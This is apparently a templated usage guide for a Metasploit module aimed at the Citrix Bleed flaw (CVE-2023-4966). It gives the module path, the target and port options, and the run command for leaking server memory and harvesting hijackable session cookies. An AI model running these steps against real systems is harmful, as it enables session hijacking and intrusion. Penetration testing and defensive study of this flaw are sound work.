**The description of current metasploit exploit**
This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory for a          target Citrix ADC server. The leaked memory is then scanned for session cookies which can be hijacked if found.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/citrix_bleed_cve_2023_4966
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
# Repeat for each required parameter from Step 1
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 443 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.